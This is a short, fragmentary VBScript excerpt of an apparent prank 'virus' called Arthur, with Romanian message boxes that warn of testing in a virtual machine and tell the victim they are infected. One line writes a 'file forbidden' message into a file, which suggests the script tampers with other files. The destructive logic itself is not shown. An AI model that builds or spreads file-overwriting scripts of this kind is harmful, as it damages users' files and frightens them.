X=MsgBox("Atentie acest virus trebuie testat intr-un mediu virtual sigur vrei sa continui?",0+64,"	Virus pt TG")
...
Sub Message1
MsgBox("Ai fost virusat de virusul Arthur. Nu mai poti scapa")
End Sub
...
file.Write "MsgBox ""Arthur has made the use of this file forbidden!"""
End Sub
